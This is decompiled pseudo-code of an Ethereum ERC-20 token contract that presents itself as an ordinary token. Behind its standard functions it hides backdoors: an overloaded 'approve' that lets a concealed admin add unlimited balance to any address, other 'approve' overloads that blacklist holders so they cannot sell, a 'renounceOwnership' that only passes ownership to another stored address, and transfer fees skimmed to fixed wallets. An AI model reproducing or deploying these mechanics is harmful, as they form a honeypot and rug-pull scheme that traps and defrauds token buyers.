contract main {




// =====================  Runtime code  =====================


address stor0;
address owner;
address stor2;
mapping of uint8 stor4;
mapping of uint8 stor5;
mapping of uint256 allowance;
mapping of uint256 balanceOf;
uint256 totalSupply;
uint256 stor9;
uint256 stor10;
address stor11;
uint8 stor13;
uint8 decimals; offset 168
address stor13;
address stor13; offset 8
array of uint256 symbol;
array of uint256 name;
uint256 stor17;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function approve(address arg1) payable {
    require calldata.size - 4 >= 32
    require stor0 == msg.sender
    stor4[address(arg1)] = 1
}

function _approve(address arg1) payable {
    require calldata.size - 4 >= 32
    require stor0 == msg.sender
    stor4[address(arg1)] = 0
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = stor2
}

function transfer(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg2:
        revert with 0, 'a'
    stor0 = arg1
}

function approve(address arg1, uint256 arg2, address arg3) payable {
    require calldata.size - 4 >= 96
    require stor0 == msg.sender
    if arg3:
        revert with 0, ' '
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
}

function changeTokenName(string arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + arg1.length + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    name[] = Array(len=arg1.length, data=arg1[all])
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if stor5[address(msg.sender)]:
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg2 <= 0:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
        if uint8(stor13.field_0):
            if stor4[address(msg.sender)]:
                revert with 0, '', mem[164]
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        38,
                        0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[202 len 26]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        36,
                        0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[200 len 28]
        if arg2 > balanceOf[address(msg.sender)]:
            revert with 0, 'SafeMath: subtraction overflow'
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if stor5[address(arg1)]:
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg2 <= 0:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
            if uint8(stor13.field_0):
                if stor4[address(msg.sender)]:
                    revert with 0, '', mem[164]
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            38,
                            0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[202 len 26]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            36,
                            0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[200 len 28]
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if not arg2:
                if arg2:
                    require arg2
                    if arg2 * stor9 / arg2 != stor9:
                        revert with 0, 32, 38, 0x73536166654d6174683a206d756c7469706c6944656164756e7273696f6e206f766572666c6f, mem[266 len 26]
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not address(stor13.field_8):
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            require arg2
            if arg2 * stor10 / arg2 != stor10:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            38,
                            0x73536166654d6174683a206d756c7469706c6944656164756e7273696f6e206f766572666c6f,
                            mem[202 len 26]
            if not arg2:
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not address(stor13.field_8):
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                if arg2 * stor10 / 100 <= 0:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
                if uint8(stor13.field_0):
                    if stor4[address(msg.sender)]:
                        revert with 0, '', mem[292]
                if not msg.sender:
                    revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[330 len 26]
                if not address(stor13.field_8):
                    revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[328 len 28]
                if arg2 * stor10 / 100 > balanceOf[address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(msg.sender)] -= arg2 * stor10 / 100
                if balanceOf[address(stor13.field_0)] + (arg2 * stor10 / 100) < balanceOf[address(stor13.field_0)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(stor13.field_0)] += arg2 * stor10 / 100
                emit Transfer((arg2 * stor10 / 100), msg.sender, address(stor13.field_8));
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
                if not stor11:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            require arg2
            if arg2 * stor9 / arg2 != stor9:
                revert with 0, 32, 38, 0x73536166654d6174683a206d756c7469706c6944656164756e7273696f6e206f766572666c6f, mem[266 len 26]
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
            if not address(stor13.field_8):
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
            if arg2 * stor10 / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            if uint8(stor13.field_0):
                if stor4[address(msg.sender)]:
                    revert with 0, '', mem[292]
            if not msg.sender:
                revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[330 len 26]
            if not address(stor13.field_8):
                revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[328 len 28]
            if arg2 * stor10 / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2 * stor10 / 100
            if balanceOf[address(stor13.field_0)] + (arg2 * stor10 / 100) < balanceOf[address(stor13.field_0)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(stor13.field_0)] += arg2 * stor10 / 100
            emit Transfer((arg2 * stor10 / 100), msg.sender, address(stor13.field_8));
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not stor11:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg2 * stor9 / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if uint8(stor13.field_0):
                if stor4[address(msg.sender)]:
                    revert with 0, '', mem[356]
            if not msg.sender:
                revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[394 len 26]
            if not stor11:
                revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[392 len 28]
            if arg2 * stor9 / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2 * stor9 / 100
            if balanceOf[stor11] + (arg2 * stor9 / 100) < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] += arg2 * stor9 / 100
            emit Transfer((arg2 * stor9 / 100), msg.sender, stor11);
            if arg2 * stor10 / 100 > arg2:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg2 * stor9 / 100 > arg2 - (arg2 * stor10 / 100):
                revert with 0, 'SafeMath: subtraction overflow'
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
            if not arg1:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
            if arg2 - (arg2 * stor10 / 100) - (arg2 * stor9 / 100) <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[589 len 23]
            if uint8(stor13.field_0):
                if stor4[address(msg.sender)]:
                    revert with 0, '', mem[548]
            if not msg.sender:
                revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[586 len 26]
            if not arg1:
                revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[584 len 28]
            if arg2 - (arg2 * stor10 / 100) - (arg2 * stor9 / 100) > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * stor10 / 100) + (arg2 * stor9 / 100)
            if balanceOf[address(arg1)] + arg2 - (arg2 * stor10 / 100) - (arg2 * stor9 / 100) < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * stor10 / 100) - (arg2 * stor9 / 100)
            emit Transfer((arg2 - (arg2 * stor10 / 100) - (arg2 * stor9 / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    stor17 = 6541
    if stor5[address(msg.sender)]:
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg3 <= 0:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
        if uint8(stor13.field_0):
            if stor4[address(arg1)]:
                revert with 0, '', mem[164]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        38,
                        0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[202 len 26]
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        36,
                        0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[200 len 28]
        if arg3 > balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: subtraction overflow'
        balanceOf[address(arg1)] -= arg3
        if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if stor5[address(arg2)]:
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg3 <= 0:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
            if uint8(stor13.field_0):
                if stor4[address(arg1)]:
                    revert with 0, '', mem[164]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            38,
                            0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[202 len 26]
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            36,
                            0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[200 len 28]
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            if not arg3:
                if not arg3:
                    if not arg1:
                        revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                    if not address(stor13.field_8):
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
                require arg3
                if arg3 * stor10 / arg3 != stor10:
                    revert with 0, 32, 38, 0x73536166654d6174683a206d756c7469706c6944656164756e7273696f6e206f766572666c6f, mem[266 len 26]
                if not arg1:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not address(stor13.field_8):
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                if arg3 * stor10 / 100 <= 0:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
                if uint8(stor13.field_0):
                    if stor4[address(arg1)]:
                        revert with 0, '', mem[292]
                if not arg1:
                    revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[330 len 26]
                if not address(stor13.field_8):
                    revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[328 len 28]
                if arg3 * stor10 / 100 > balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                balanceOf[address(arg1)] -= arg3 * stor10 / 100
                if balanceOf[address(stor13.field_0)] + (arg3 * stor10 / 100) < balanceOf[address(stor13.field_0)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(stor13.field_0)] += arg3 * stor10 / 100
                emit Transfer((arg3 * stor10 / 100), arg1, address(stor13.field_8));
                if not arg1:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
                if not stor11:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            require arg3
            if arg3 * stor9 / arg3 != stor9:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            38,
                            0x73536166654d6174683a206d756c7469706c6944656164756e7273696f6e206f766572666c6f,
                            mem[202 len 26]
            if not arg3:
                if not arg1:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
                if not address(stor13.field_8):
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            require arg3
            if arg3 * stor10 / arg3 != stor10:
                revert with 0, 32, 38, 0x73536166654d6174683a206d756c7469706c6944656164756e7273696f6e206f766572666c6f, mem[266 len 26]
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[329 len 27]
            if not address(stor13.field_8):
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[327 len 29]
            if arg3 * stor10 / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[333 len 23]
            if uint8(stor13.field_0):
                if stor4[address(arg1)]:
                    revert with 0, '', mem[292]
            if not arg1:
                revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[330 len 26]
            if not address(stor13.field_8):
                revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[328 len 28]
            if arg3 * stor10 / 100 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3 * stor10 / 100
            if balanceOf[address(stor13.field_0)] + (arg3 * stor10 / 100) < balanceOf[address(stor13.field_0)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(stor13.field_0)] += arg3 * stor10 / 100
            emit Transfer((arg3 * stor10 / 100), arg1, address(stor13.field_8));
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not stor11:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg3 * stor9 / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if uint8(stor13.field_0):
                if stor4[address(arg1)]:
                    revert with 0, '', mem[356]
            if not arg1:
                revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[394 len 26]
            if not stor11:
                revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[392 len 28]
            if arg3 * stor9 / 100 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3 * stor9 / 100
            if balanceOf[stor11] + (arg3 * stor9 / 100) < balanceOf[stor11]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor11] += arg3 * stor9 / 100
            emit Transfer((arg3 * stor9 / 100), arg1, stor11);
            if arg3 * stor10 / 100 > arg3:
                revert with 0, 'SafeMath: subtraction overflow'
            if arg3 * stor9 / 100 > arg3 - (arg3 * stor10 / 100):
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[585 len 27]
            if not arg2:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[583 len 29]
            if arg3 - (arg3 * stor10 / 100) - (arg3 * stor9 / 100) <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[589 len 23]
            if uint8(stor13.field_0):
                if stor4[address(arg1)]:
                    revert with 0, '', mem[548]
            if not arg1:
                revert with 0, 32, 38, 0x734942455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[586 len 26]
            if not arg2:
                revert with 0, 32, 36, 0x6f4942455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[584 len 28]
            if arg3 - (arg3 * stor10 / 100) - (arg3 * stor9 / 100) > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * stor10 / 100) + (arg3 * stor9 / 100)
            if balanceOf[address(arg2)] + arg3 - (arg3 * stor10 / 100) - (arg3 * stor9 / 100) < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * stor10 / 100) - (arg3 * stor9 / 100)
            emit Transfer((arg3 - (arg3 * stor10 / 100) - (arg3 * stor9 / 100)), arg1, arg2);
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[616 len 24],
                            mem[664 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[744 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[742 len 30]
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
